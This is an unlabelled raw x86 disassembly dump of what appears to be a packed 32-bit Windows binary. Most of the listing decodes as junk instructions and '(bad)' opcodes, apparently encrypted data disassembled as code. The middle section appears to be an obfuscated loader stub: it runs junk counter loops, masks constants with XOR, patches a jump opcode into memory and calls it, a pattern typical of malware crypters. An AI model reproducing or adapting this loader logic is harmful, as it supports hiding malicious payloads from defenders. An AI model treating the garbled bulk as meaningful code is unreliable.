  406eba:	dec    esp
  406ebb:	(bad)  
  406ebd:	fmul   st,st(3)
  406ebf:	ret    0x665c
  406ec2:	sub    eax,0x55e4b379
  406ec7:	or     ebp,esp
  406ec9:	rcl    DWORD PTR [ecx-0x12dfd9b9],0xec
  406ed0:	mov    al,ds:0x70246bc8
  406ed5:	aam    0x81
  406ed7:	push   ecx
  406ed8:	std    
  406ed9:	nop
  406eda:	pop    DWORD PTR [esi+ebp*4-0x2854fbd9]
  406ee1:	xchg   esp,eax
  406ee2:	sbb    esp,DWORD PTR [eax+0x43]
  406ee5:	mov    eax,0x56bf71e4
  406eea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eeb:	sbb    al,0x4c
  406eed:	inc    esi
  406eee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eef:	mov    edi,0x86ce394d
  406ef4:	xor    dh,BYTE PTR [ebp-0x51bf96fa]
  406efa:	adc    eax,0xe75baf1
  406eff:	es imul esi,ecx,0xffffffbd
  406f03:	xchg   dh,cl
  406f05:	in     al,0x53
  406f07:	ins    BYTE PTR es:[edi],dx
  406f08:	sbb    eax,0x3679a9b5
  406f0d:	push   es
  406f0e:	not    BYTE PTR [edi-0x556c708b]
  406f14:	mov    cl,0x1c
  406f16:	mov    edx,0x112d64fe
  406f1b:	lock jne 0x406f70
  406f1e:	(bad)  
  406f1f:	outs   dx,BYTE PTR ds:[esi]
  406f20:	pop    ds
  406f21:	pop    esi
  406f22:	jnp    0x406f3a
  406f24:	add    eax,0xe6b82b7c
  406f29:	sub    edx,DWORD PTR [edi+0xe3c6a71]
  406f2f:	push   0x7e
  406f31:	adc    cl,dh
  406f33:	cwde   
  406f34:	pop    ecx
  406f35:	rcr    DWORD PTR [eax-0x7ba066f1],0x2c
  406f3c:	jle    0x406f46
  406f3e:	pop    ebx
  406f3f:	pop    eax
  406f40:	addr16 push 0x921c38a
  406f46:	add    DWORD PTR [edx],edx
  406f48:	sub    DWORD PTR [ecx+0x4f65abc9],edx
  406f4e:	fwait
  406f4f:	and    eax,0x8e3e5497
  406f54:	pmaxub mm7,QWORD PTR cs:[esp+edi*8+0x59]
  406f5a:	cmp    eax,0xdf39135
  406f5f:	test   DWORD PTR [eax*2+0x3fa32eec],ecx
  406f66:	enter  0x18f0,0x9b
  406f6a:	bound  eax,QWORD PTR [ecx-0x266a9ebb]
  406f70:	call   0x8697:0xddc4bf9e
  406f77:	lea    ebp,[edi]
  406f79:	pop    edx
  406f7a:	js     0x406f70
  406f7c:	(bad)  
  406f7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f7e:	sti    
  406f7f:	daa    
  406f80:	es mov bh,0x92
  406f83:	jb     0x406fdc
  406f85:	aad    0x6d
  406f87:	adc    DWORD PTR [eax-0x563a5081],edx
  406f8d:	xchg   esi,eax
  406f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f8f:	push   0x51
  406f91:	adc    eax,0x51fe70e5
  406f96:	mov    ebp,ebp
  406f98:	push   edx
  406f99:	mov    eax,ds:0x1b087934
  406f9e:	inc    eax
  406f9f:	stc    
  406fa0:	mov    ebx,0x8f09e223
  406fa5:	fs jecxz 0x406fe0
  406fa8:	adc    DWORD PTR [ebx-0x49],edi
  406fab:	jne    0x407024
  406fad:	jo     0x406f5a
  406faf:	(bad)
  406fb2:	inc    edi
  406fb3:	clc    
  406fb4:	popf   
  406fb5:	std    
  406fb6:	push   ecx
  406fb7:	jns    0x40701e
  406fb9:	dec    esi
  406fba:	cmp    eax,0xa663d747
  406fbf:	add    eax,0x9b00e97b
  406fc4:	fidiv  DWORD PTR [ebp+0x73fe4372]
  406fca:	mov    ah,0x84
  406fcc:	popf   
  406fcd:	(bad)  
  406fce:	fstp   TBYTE PTR [esi-0x12cb7ea1]
  406fd4:	mov    ebp,0x3baf712b
  406fd9:	ja     0x406f5f
  406fdb:	repnz repnz cli 
  406fde:	outs   dx,DWORD PTR ds:[esi]
  406fdf:	mov    ds:0xc1f56bf4,al
  406fe4:	and    DWORD PTR [edi],0x3edb5404
  406fea:	test   eax,0xb1c53438
  406fef:	ss jae 0x407070
  406ff2:	cmp    BYTE PTR ds:0xbc22fe0d,bh
  406ff8:	in     al,dx
  406ff9:	mov    esi,0x10fb1ef1
  406ffe:	push   ss
  406fff:	sahf   
  407000:	mov    ebx,0xee615229
  407005:	nop
  407006:	test   BYTE PTR [ebx],bh
  407008:	sar    BYTE PTR [ecx+0x62],1
  40700b:	retf   
  40700c:	add    BYTE PTR ds:0x8a6d8b95,0x2a
  407013:	pop    ds
  407014:	inc    ecx
  407015:	pop    ebp
  407016:	pop    ss
  407017:	fild   WORD PTR [ebp-0x55]
  40701a:	xchg   edi,eax
  40701b:	cli    
  40701c:	xor    cl,bl
  40701e:	pop    esi
  40701f:	dec    eax
  407020:	test   al,0x88
  407022:	and    esi,edx
  407024:	cmp    eax,0x572993a
  407029:	push   ebx
  40702a:	jle    0x40709a
  40702c:	push   cs
  40702d:	pop    esp
  40702e:	dec    esi
  40702f:	pop    ebx
  407030:	and    al,0xe1
  407032:	adc    eax,0xe7a37c62
  407037:	mov    DWORD PTR [eax],0xa1a7d473
  40703d:	mov    ds:0x957caa0b,eax
  407042:	test   eax,0x189845bb
  407047:	mov    bh,0x64
  407049:	sbb    DWORD PTR [ebx-0x4e5eada9],esp
  40704f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407050:	xlat   BYTE PTR ds:[ebx]
  407051:	mov    bh,0x94
  407053:	dec    edx
  407054:	push   cs
  407055:	mov    DWORD PTR [ebx],ebx
  407057:	mov    al,BYTE PTR [esp+ecx*4]
  40705a:	ss dec ebp
  40705c:	(bad)  
  40705d:	ins    DWORD PTR es:[edi],dx
  40705e:	into   
  40705f:	jecxz  0x406fee
  407061:	test   al,0xdb
  407063:	loope  0x407007
  407065:	sahf   
  407066:	shl    DWORD PTR [ebp+eax*1+0x6d507f06],0x39
  40706e:	mov    ebx,0xca491795
  407073:	jae    0x40704c
  407075:	pop    edi
  407076:	arpl   WORD PTR [edi-0x64],cx
  407079:	jle    0x4070ca
  40707b:	add    BYTE PTR [edx],cl
  40707d:	push   ebp
  40707e:	push   edx
  40707f:	inc    ebx
  407080:	es inc ecx
  407082:	push   gs
  407084:	in     eax,dx
  407085:	aam    0x4f
  407087:	mov    ch,0xd
  407089:	xchg   edx,eax
  40708a:	mov    ebx,0xe97c5d51
  40708f:	pusha  
  407090:	ds xchg edx,eax
  407092:	dec    edx
  407093:	data16 sub al,0xf4
  407096:	xchg   esp,eax
  407097:	les    esi,FWORD PTR [ebx-0x54]
  40709a:	mov    ss,ecx
  40709c:	in     al,dx
  40709d:	add    DWORD PTR [edx-0x38548348],edi
  4070a3:	xchg   ebp,eax
  4070a4:	jae    0x40703f
  4070a6:	cmc    
  4070a7:	sub    ecx,ecx
  4070a9:	(bad)  
  4070aa:	jbe    0x407038
  4070ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070ad:	mov    edi,0xcb5e5825
  4070b2:	aad    0x87
  4070b4:	xchg   edi,eax
  4070b5:	push   0x53
  4070b7:	and    DWORD PTR [ecx+0x40],ecx
  4070ba:	push   es
  4070bb:	in     eax,dx
  4070bc:	data16 sub dl,BYTE PTR [eax+0x671eb49e]
  4070c3:	aaa    
  4070c4:	cmp    edx,ecx
  4070c6:	adc    esi,edx
  4070c8:	cwde   
  4070c9:	lds    eax,FWORD PTR gs:[ecx+0x3294de05]
  4070d0:	ds scas al,BYTE PTR es:[edi]
  4070d2:	mov    bh,BYTE PTR [eax-0x5a]
  4070d5:	mov    dh,0x86
  4070d7:	xor    eax,0x4b157884
  4070dc:	mov    BYTE PTR [esp+ecx*8+0x36416dba],dl
  4070e3:	jge    0x407159
  4070e5:	push   es
  4070e6:	add    BYTE PTR [ebp+0x683e74e2],dh
  4070ec:	xchg   edx,eax
  4070ed:	fidiv  WORD PTR ds:[edx+0x4ac8487a]
  4070f4:	xor    eax,0xda0fdafc
  4070f9:	and    al,0xb6
  4070fb:	push   edi
  4070fc:	outs   dx,BYTE PTR ds:[esi]
  4070fd:	pop    es
  4070fe:	xor    DWORD PTR [ebx+0x4db00074],0xd
  407105:	xchg   edx,eax
  407106:	test   BYTE PTR [ebx+0xc8343e6],bl
  40710c:	dec    edx
  40710d:	pop    ds
  40710e:	pop    eax
  40710f:	cwde   
  407110:	add    eax,0xacf43935
  407115:	(bad)  
  407116:	or     eax,0x6cf63010
  40711b:	adc    DWORD PTR [edx],edi
  40711d:	(bad)  
  40711f:	mov    al,ds:0xaad8b061
  407124:	out    0x98,al
  407126:	push   0x3c
  407128:	cmp    dl,dh
  40712a:	ins    DWORD PTR es:[edi],dx
  40712b:	mov    ebx,ebp
  40712d:	rcl    DWORD PTR [edi],0x18
  407130:	mov    al,ds:0xec7a0002
  407135:	cld    
  407136:	dec    ecx
  407137:	loop   0x407166
  407139:	(bad)  [ebx-0x4f]
  40713c:	mov    ebp,0xb85b9c6b
  407141:	mov    esp,0xd617e33a
  407146:	jbe    0x40710b
  407148:	inc    edx
  407149:	popf   
  40714a:	hlt    
  40714b:	stos   BYTE PTR es:[edi],al
  40714c:	in     eax,dx
  40714d:	outs   dx,BYTE PTR ds:[esi]
  40714e:	sahf   
  40714f:	lods   al,BYTE PTR ds:[esi]
  407150:	cmovge esi,DWORD PTR [eax-0xd644864]
  407157:	mov    bl,0x14
  407159:	mov    eax,ds:0x35c8c89e
  40715e:	inc    ecx
  40715f:	sbb    ebp,DWORD PTR [eax+0x8]
  407162:	mov    ch,0x34
  407164:	test   eax,0xe845bd07
  407169:	fild   QWORD PTR [ebx]
  40716b:	nop
  40716c:	push   ebp
  40716d:	pusha  
  40716e:	leave  
  40716f:	cld    
  407170:	sti    
  407171:	push   es
  407172:	in     eax,dx
  407173:	xchg   ecx,eax
  407174:	scas   eax,DWORD PTR es:[edi]
  407175:	retf   0x541f
  407178:	mov    WORD PTR [ebx-0x2e],gs
  40717b:	pop    esi
  40717c:	sbb    ebx,DWORD PTR [eax-0x277faef0]
  407182:	mov    dl,dl
  407184:	mov    DWORD PTR [esi-0x5d],ecx
  407187:	mov    dl,0x80
  407189:	push   esi
  40718a:	iret   
  40718b:	cmp    DWORD PTR [eax+eax*1-0x23],ecx
  40718f:	sub    ah,al
  407191:	pushf  
  407192:	sub    ch,BYTE PTR [ebp+0x276802d]
  407198:	adc    bh,ah
  40719a:	(bad)  
  40719b:	fdivrp st(3),st
  40719d:	hlt    
  40719e:	call   0x3414c432
  4071a3:	add    BYTE PTR [edx+eax*2],bl
  4071a6:	pop    esp
  4071a7:	loopne 0x407133
  4071a9:	push   ss
  4071aa:	xchg   ebp,eax
  4071ab:	(bad)  
  4071ac:	pop    eax
  4071ad:	sbb    eax,0x535cf78f
  4071b2:	retf   0x973b
  4071b5:	test   eax,0x19d7d9a9
  4071ba:	pop    ecx
  4071bb:	rol    BYTE PTR [eax-0x55],cl
  4071be:	and    ebx,DWORD PTR [ebp-0xf6485c]
  4071c4:	jecxz  0x4071c0
  4071c6:	mov    esp,0x67ada0b6
  4071cb:	cs push edi
  4071cd:	dec    ecx
  4071ce:	sub    DWORD PTR [edi+0x8],edi
  4071d1:	out    dx,eax
  4071d2:	jns    0x4071fa
  4071d4:	pop    edx
  4071d5:	int3   
  4071d6:	jbe    0x4071e0
  4071d8:	in     eax,dx
  4071d9:	aad    0x9f
  4071db:	pop    ds
  4071dc:	cmp    DWORD PTR [edi],0x3dfef6ad
  4071e2:	cmp    ch,BYTE PTR [ecx]
  4071e4:	mov    ds:0x486f576a,al
  4071e9:	and    eax,DWORD PTR [ebp-0x70]
  4071ec:	in     eax,dx
  4071ed:	test   BYTE PTR [esi+eax*1+0xe018399],al
  4071f4:	dec    ebx
  4071f6:	ins    BYTE PTR es:[edi],dx
  4071f7:	ds add al,0x5c
  4071fa:	imul   ecx,DWORD PTR [edx-0x4a],0xf8676868
  407201:	ins    DWORD PTR es:[edi],dx
  407202:	std    
  407203:	shl    BYTE PTR [edi+0x31],cl
  407206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407207:	das    
  407208:	lea    ecx,[eax]
  40720a:	xlat   BYTE PTR ds:[ebx]
  40720b:	test   BYTE PTR [ebx-0x36008ce1],ah
  407211:	xchg   edi,eax
  407212:	xor    eax,ecx
  407214:	mov    edx,0x3272dd
  407219:	add    eax,edx
  40721b:	mov    DWORD PTR [ebp+0x8],eax
  40721e:	mov    eax,DWORD PTR [ebp-0x14]
  407221:	xor    eax,ecx
  407223:	add    eax,edx
  407225:	mov    edx,DWORD PTR [ebp+0x14]
  407228:	imul   eax,DWORD PTR [edx]
  40722b:	mov    edx,DWORD PTR [ebp-0x4]
  40722e:	xor    edx,ecx
  407230:	mov    ecx,DWORD PTR [ebp+0x8]
  407233:	lea    ecx,[edx+ecx*1+0x3272dd]
  40723a:	cmp    ecx,eax
  40723c:	je     0x4072b3
  407242:	mov    edi,DWORD PTR [ebp-0x14]
  407245:	mov    eax,DWORD PTR [ebp+0x8]
  407248:	mov    edx,DWORD PTR [ebp+0x14]
  40724b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40724f:	mov    ecx,0x7510896
  407254:	xor    edx,edx
  407256:	xor    edi,ecx
  407258:	mov    esi,0x3272dd
  40725d:	add    edi,esi
  40725f:	div    edi
  407261:	mov    edx,DWORD PTR [ebp-0x4]
  407264:	xor    edx,ecx
  407266:	lea    eax,[edx+eax*1+0x3272dd]
  40726d:	mov    edx,DWORD PTR [ebp+0x8]
  407270:	mov    edi,DWORD PTR [ebp-0x20]
  407273:	mov    DWORD PTR [edi+edx*4],eax
  407276:	mov    eax,DWORD PTR [ebp-0x14]
  407279:	mov    edx,DWORD PTR [ebp+0x8]
  40727c:	xor    eax,ecx
  40727e:	lea    eax,[eax+edx*1+0x3272dd]
  407285:	mov    DWORD PTR [ebp+0x8],eax
  407288:	mov    eax,DWORD PTR [ebp-0x14]
  40728b:	mov    edx,DWORD PTR [ebp+0x14]
  40728e:	xor    eax,ecx
  407290:	add    eax,esi
  407292:	imul   eax,DWORD PTR [edx]
  407295:	mov    edx,DWORD PTR [ebp-0x4]
  407298:	xor    edx,ecx
  40729a:	mov    ecx,DWORD PTR [ebp+0x8]
  40729d:	lea    ecx,[edx+ecx*1+0x3272dd]
  4072a4:	cmp    ecx,eax
  4072a6:	jne    0x407242
  4072ac:	mov    eax,esi
  4072ae:	jmp    0x4072b8
  4072b3:	mov    eax,0x3272dd
  4072b8:	mov    ebx,0x7510896
  4072bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4072c0:	xor    ecx,ebx
  4072c2:	add    ecx,eax
  4072c4:	mov    DWORD PTR [ebp-0xc],ecx
  4072c7:	mov    ebx,0x65655
  4072cc:	add    ebx,0x3234
  4072d2:	xchg   ebx,esi
  4072d4:	xor    ebx,ebx
  4072d6:	push   esi
  4072d7:	mov    esi,ebx
  4072d9:	pop    ebx
  4072da:	mov    edx,esi
  4072dc:	add    ebx,0x1002
  4072e2:	lea    eax,[ebp-0x10]
  4072e5:	add    edx,eax
  4072e7:	add    edx,0x5
  4072ea:	push   edx
  4072eb:	inc    esi
  4072ec:	pop    ecx
  4072ed:	dec    ecx
  4072ee:	xchg   ecx,eax
  4072ef:	dec    eax
  4072f0:	xchg   ecx,eax
  4072f1:	dec    ecx
  4072f2:	xchg   ecx,edx
  4072f4:	dec    edx
  4072f5:	push   edx
  4072f6:	mov    edx,ebx
  4072f8:	pop    ebx
  4072f9:	dec    ebx
  4072fa:	call   DWORD PTR [ebx]
  4072fc:	cmp    DWORD PTR [ebp+0x10],esi
  4072ff:	je     0x40731e
  407305:	xchg   edx,eax
  407306:	push   0xb
  407308:	pop    ecx
  407309:	push   0x4
  40730b:	pop    ebx
  40730c:	inc    ebx
  40730d:	xchg   ebx,ecx
  40730f:	sub    ebx,ecx
  407311:	xchg   ebx,ecx
  407313:	dec    ecx
  407314:	dec    ecx
  407315:	mov    eax,DWORD PTR [ebp-0x1c]
  407318:	imul   eax,ecx
  40731b:	add    esp,eax
  40731d:	xchg   edx,eax
  40731e:	push   eax
  40731f:	xor    ebx,ebx
  407321:	mov    edx,esp
  407323:	dec    edx
  407324:	inc    ebx
  407325:	add    ebx,DWORD PTR [edx+ebx*1]
  407328:	dec    ebx
  407329:	xor    edx,edx
  40732b:	add    DWORD PTR [ebp-0xc],ebx
  40732e:	pop    ebx
  40732f:	mov    eax,DWORD PTR [ebp-0xc]
  407332:	pop    edi
  407333:	pop    esi
  407334:	pop    ebx
  407335:	leave  
  407336:	ret    0x10
  407339:	push   ebp
  40733a:	mov    ebp,esp
  40733c:	sub    esp,0x7c
  40733f:	and    DWORD PTR ds:0x420e92,0x0
  407349:	jmp    0x40735b
  40734e:	mov    ecx,DWORD PTR ds:0x420e92
  407354:	inc    ecx
  407355:	mov    DWORD PTR ds:0x420e92,ecx
  40735b:	cmp    DWORD PTR ds:0x420e92,0x15
  407362:	jae    0x4073cc
  407368:	cmp    DWORD PTR ds:0x420e92,0x1f
  40736f:	jne    0x407388
  407375:	push   0x3dd4
  40737a:	push   0x422018
  40737f:	push   DWORD PTR [ebp-0xc]
  407382:	call   DWORD PTR ds:0x4247e5
  407388:	jmp    0x40734e
  40738d:	mov    DWORD PTR ds:0x420f64,0x1c
  407397:	cmp    DWORD PTR ds:0x420f64,0x0
  40739e:	je     0x4073cc
  4073a4:	cmp    DWORD PTR ds:0x420f64,0x1d
  4073ab:	jne    0x4073b7
  4073b1:	call   DWORD PTR ds:0x4247f1
  4073b7:	mov    eax,ds:0x420f64
  4073bc:	dec    eax
  4073bd:	mov    ds:0x420f64,eax
  4073c2:	jmp    0x407397
  4073c7:	adc    eax,0x653
  4073cc:	push   esi
  4073cd:	and    DWORD PTR ds:0x42200c,0x0
  4073d7:	jmp    0x4073e9
  4073dc:	mov    esi,DWORD PTR ds:0x42200c
  4073e2:	inc    esi
  4073e3:	mov    DWORD PTR ds:0x42200c,esi
  4073e9:	cmp    DWORD PTR ds:0x42200c,0x16
  4073f0:	jae    0x40742e
  4073f6:	cmp    DWORD PTR ds:0x42200c,0xa
  4073fd:	jne    0x407409
  407403:	call   DWORD PTR ds:0x4247f5
  407409:	cmp    DWORD PTR ds:0x42200c,0x9
  407410:	jne    0x407423
  407416:	mov    esi,DWORD PTR ds:0x42200c
  40741c:	inc    esi
  40741d:	mov    DWORD PTR ds:0x42200c,esi
  407423:	jmp    0x4073dc
  407428:	sbb    DWORD PTR ds:0x420f00,edx
  40742e:	push   edi
  40742f:	mov    eax,ds:0x424435
  407434:	mov    DWORD PTR ds:0x420f70,0x12
  40743e:	cmp    DWORD PTR ds:0x420f70,0x0
  407445:	je     0x40748b
  40744b:	cmp    DWORD PTR ds:0x420f70,0x17
  407452:	jne    0x407479
  407458:	push   0x87b3
  40745d:	push   DWORD PTR [ebp-0x28]
  407460:	push   0x420f68
  407465:	push   0x7b70
  40746a:	push   DWORD PTR [ebp-0x18]
  40746d:	push   DWORD PTR [ebp-0x24]
  407470:	push   DWORD PTR [ebp-0x14]
  407473:	call   DWORD PTR ds:0x4247f9
  407479:	mov    edi,DWORD PTR ds:0x420f70
  40747f:	dec    edi
  407480:	mov    DWORD PTR ds:0x420f70,edi
  407486:	jmp    0x40743e
  40748b:	mov    DWORD PTR [ebp-0x24],eax
  40748e:	mov    eax,ds:0x424541
  407493:	xor    esi,edi
  407495:	mov    DWORD PTR [ebp-0x34],eax
  407498:	and    edi,DWORD PTR ds:0x420f5c
  40749e:	and    DWORD PTR [ebp-0x30],0x0
  4074a2:	and    eax,edi
  4074a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  4074ab:	adc    DWORD PTR ds:0x420ef0,edx
  4074b1:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  4074b8:	mov    edi,DWORD PTR ds:0x420ec2
  4074be:	mov    eax,ds:0x420f7c
  4074c3:	sub    edi,eax
  4074c5:	sub    edi,DWORD PTR [edi+eax*1]
  4074c8:	mov    eax,DWORD PTR [ebp-0x10]
  4074cb:	or     edi,0x1b5b
  4074d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4074d4:	and    DWORD PTR ds:0x420ea2,0x0
  4074de:	xor    esi,esi
  4074e0:	xor    esi,DWORD PTR ds:0x420ea2
  4074e6:	inc    esi
  4074e7:	mov    DWORD PTR ds:0x420ea2,esi
  4074ed:	cmp    DWORD PTR ds:0x420ea2,0x20
  4074f4:	jne    0x407508
  4074fa:	push   DWORD PTR [ebp-0x28]
  4074fd:	push   0x424093
  407502:	call   DWORD PTR ds:0x4247fd
  407508:	cmp    DWORD PTR ds:0x420ea2,0x19
  40750f:	jb     0x4074de
  407515:	sub    eax,ecx
  407517:	and    DWORD PTR ds:0x420fac,0x0
  407521:	xor    ecx,ecx
  407523:	or     ecx,DWORD PTR ds:0x420fac
  407529:	inc    ecx
  40752a:	mov    DWORD PTR ds:0x420fac,ecx
  407530:	cmp    DWORD PTR ds:0x420fac,0x5
  407537:	jne    0x407550
  40753d:	push   0x42414e
  407542:	push   0x0
  407544:	push   DWORD PTR [ebp-0x28]
  407547:	push   DWORD PTR [ebp-0x10]
  40754a:	call   DWORD PTR ds:0x424801
  407550:	cmp    DWORD PTR ds:0x420fac,0x4
  407557:	jne    0x40756a
  40755d:	mov    ecx,DWORD PTR ds:0x420fac
  407563:	inc    ecx
  407564:	mov    DWORD PTR ds:0x420fac,ecx
  40756a:	cmp    DWORD PTR ds:0x420fac,0x16
  407571:	jb     0x407521
  407577:	and    DWORD PTR ds:0x420f9c,0x0
  407581:	jmp    0x407593
  407586:	mov    ecx,DWORD PTR ds:0x420f9c
  40758c:	inc    ecx
  40758d:	mov    DWORD PTR ds:0x420f9c,ecx
  407593:	cmp    DWORD PTR ds:0x420f9c,0x11
  40759a:	jae    0x4075dc
  4075a0:	cmp    DWORD PTR ds:0x420f9c,0x5
  4075a7:	jne    0x4075bd
  4075ad:	push   0x420f74
  4075b2:	push   0x1cd6
  4075b7:	call   DWORD PTR ds:0x424805
  4075bd:	cmp    DWORD PTR ds:0x420f9c,0x4
  4075c4:	jne    0x4075d7
  4075ca:	mov    ecx,DWORD PTR ds:0x420f9c
  4075d0:	inc    ecx
  4075d1:	mov    DWORD PTR ds:0x420f9c,ecx
  4075d7:	jmp    0x407586
  4075dc:	mov    DWORD PTR [ebp-0x10],eax
  4075df:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  4075e6:	mov    eax,DWORD PTR [ebp-0x18]
  4075e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4075ec:	sub    eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x18],eax
  4075f1:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4075f8:	mov    eax,DWORD PTR [ebp-0xc]
  4075fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4075fe:	sub    eax,ecx
  407600:	mov    DWORD PTR [ebp-0xc],eax
  407603:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40760a:	mov    eax,DWORD PTR [ebp-0x1c]
  40760d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407610:	sub    eax,ecx
  407612:	mov    DWORD PTR [ebp-0x1c],eax
  407615:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40761c:	mov    eax,DWORD PTR [ebp-0x20]
  40761f:	mov    ecx,DWORD PTR [ebp-0x20]
  407622:	sub    eax,ecx
  407624:	mov    DWORD PTR [ebp-0x20],eax
  407627:	mov    eax,DWORD PTR [ebp-0x2c]
  40762a:	mov    ecx,DWORD PTR [ebp-0x20]
  40762d:	mov    esi,0x7510896
  407632:	xor    eax,esi
  407634:	mov    edi,0x3272dd
  407639:	add    eax,edi
  40763b:	or     eax,ecx
  40763d:	mov    DWORD PTR [ebp-0x20],eax
  407640:	mov    eax,DWORD PTR [ebp-0x4]
  407643:	mov    ecx,DWORD PTR [ebp-0x4]
  407646:	sub    eax,ecx
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	or     DWORD PTR [ebp-0x4],0xf89c85be
  407652:	mov    eax,DWORD PTR [ebp-0xc]
  407655:	xor    eax,esi
  407657:	add    eax,edi
  407659:	push   eax
  40765a:	mov    eax,DWORD PTR [ebp-0x10]
  40765d:	xor    eax,esi
  40765f:	add    eax,edi
  407661:	push   eax
  407662:	mov    eax,DWORD PTR [ebp-0x4]
  407665:	xor    eax,esi
  407667:	add    eax,edi
  407669:	push   eax
  40766a:	lea    eax,[ebp-0x7c]
  40766d:	push   eax
  40766e:	push   DWORD PTR [ebp-0x2c]
  407671:	push   DWORD PTR [ebp-0x28]
  407674:	call   0x410b90
  407679:	test   eax,eax
  40767b:	je     0x4076a9
  407681:	lea    eax,[ebp-0x7c]
  407684:	push   eax
  407685:	mov    eax,DWORD PTR [ebp-0x28]
  407688:	xor    eax,esi
  40768a:	add    eax,edi
  40768c:	push   eax
  40768d:	mov    eax,DWORD PTR [ebp-0x24]
  407690:	add    eax,0xaa
  407695:	push   eax
  407696:	mov    eax,DWORD PTR [ebp-0x24]
  407699:	mov    eax,DWORD PTR [eax+0x198]
  40769f:	push   DWORD PTR [eax]
  4076a1:	call   0x402470
  4076a6:	mov    DWORD PTR [ebp-0x14],eax
  4076a9:	lea    eax,[ebp+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x30],eax
  4076af:	mov    eax,DWORD PTR [ebp-0x14]
  4076b2:	test   eax,eax
  4076b4:	je     0x40771c
  4076ba:	lea    eax,[ebp-0x8]
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	mov    eax,DWORD PTR [ebp-0x34]
  4076c3:	mov    DWORD PTR [ebp-0x8],eax
  4076c6:	mov    eax,DWORD PTR [ebp-0x8]
  4076c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4076cc:	sub    eax,ecx
  4076ce:	mov    DWORD PTR [ebp-0x8],eax
  4076d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4076d4:	xor    ecx,esi
  4076d6:	mov    eax,0xffcd8d23
  4076db:	sub    eax,ecx
  4076dd:	add    DWORD PTR [ebp-0x8],eax
  4076e0:	mov    eax,DWORD PTR [ebp-0x8]
  4076e3:	mov    ecx,DWORD PTR [ebp-0x14]
  4076e6:	mov    DWORD PTR [ecx+0x1],eax
  4076e9:	mov    eax,DWORD PTR [ebp-0x14]
  4076ec:	push   DWORD PTR [ebp-0x24]
  4076ef:	mov    BYTE PTR [eax],0xe9
  4076f2:	mov    eax,ds:0x4242b1
  4076f7:	push   DWORD PTR [eax]
  4076f9:	push   DWORD PTR ds:0x42450d
  4076ff:	push   DWORD PTR ds:0x4242b9
  407705:	push   DWORD PTR ds:0x4244ed
  40770b:	push   DWORD PTR ds:0x4245a5
  407711:	push   DWORD PTR [ebp-0x28]
  407714:	push   DWORD PTR [ebp-0x2c]
  407717:	mov    eax,DWORD PTR [ebp-0x14]
  40771a:	call   eax
  40771c:	mov    eax,DWORD PTR [ebp-0x30]
  40771f:	mov    ecx,DWORD PTR ds:0x4244b1
  407725:	add    DWORD PTR [eax],ecx
  407727:	pop    edi
  407728:	pop    esi
  407729:	leave  
  40772a:	ret    
  40772b:	push   ebp
  40772c:	mov    ebp,esp
  40772e:	sub    esp,0x18
  407731:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  407738:	lea    eax,[ebp+0x14]
  40773b:	mov    DWORD PTR [ebp-0x4],eax
  40773e:	jmp    0x409ab8
  407743:	das    
  407744:	or     DWORD PTR [eax+0x13b778ea],edx
  40774a:	mov    esp,DWORD PTR [esi-0x10]
  40774d:	in     eax,0x6d
  40774f:	add    edi,ecx
  407751:	arpl   WORD PTR [edi-0x66],bp
  407754:	and    BYTE PTR [edx+0x7a],bh
  407757:	sbb    DWORD PTR [edi+0x7a],ebx
  40775a:	jp     0x407792
  40775c:	xchg   edi,eax
  40775d:	add    DWORD PTR [edi+0x1bdde550],ebx
  407763:	push   esi
  407764:	cmp    esi,DWORD PTR [edi]
  407766:	scas   eax,DWORD PTR es:[edi]
  407767:	pushf  
  407768:	push   ebx
  407769:	pushf  
  40776a:	out    0x78,al
  40776c:	jp     0x4077da
  40776e:	imul   ecx,ebx,0xffffffc9
  407771:	sub    ch,BYTE PTR [edx]
  407773:	in     al,0x6b
  407775:	repz sub BYTE PTR [eax+0x1e],cl
  407779:	lods   eax,DWORD PTR ds:[esi]
  40777a:	ret    0x76a0
  40777d:	or     esp,DWORD PTR [edx+0x779a37c5]
  407783:	xor    esi,DWORD PTR [edi+eiz*2-0x37]
  407787:	or     BYTE PTR [esi+0x38c17b75],cl
  40778d:	arpl   si,di
  40778f:	imul   ebx,DWORD PTR [ecx+0x41],0xffffffc9
  407793:	cmp    DWORD PTR [ebp+edx*2+0x47343303],edx
  40779a:	js     0x4077e4
  40779c:	(bad)  [edx+0x3]
  40779f:	mov    ebp,0x97c6fa1
  4077a4:	(bad)  
  4077a5:	mov    bl,0x5
  4077a7:	jno    0x4077e6
  4077a9:	loopne 0x407814
  4077ab:	cdq    
  4077ac:	fbld   TBYTE PTR [eax-0x484ceba8]
  4077b2:	repz pop esi
  4077b4:	into   
  4077b5:	repnz or BYTE PTR [ebp+0x19cf69e9],al
  4077bc:	ret    
  4077bd:	push   ss
  4077be:	loopne 0x407799
  4077c0:	inc    eax
  4077c1:	das    
  4077c2:	and    BYTE PTR [eax-0x30299ce],ah
  4077c8:	ret    
  4077c9:	mov    ds:0xcd915b7a,eax
  4077ce:	fst    QWORD PTR [esi]
  4077d0:	or     ebp,edx
  4077d2:	jmp    0x6771:0xd49d5d40
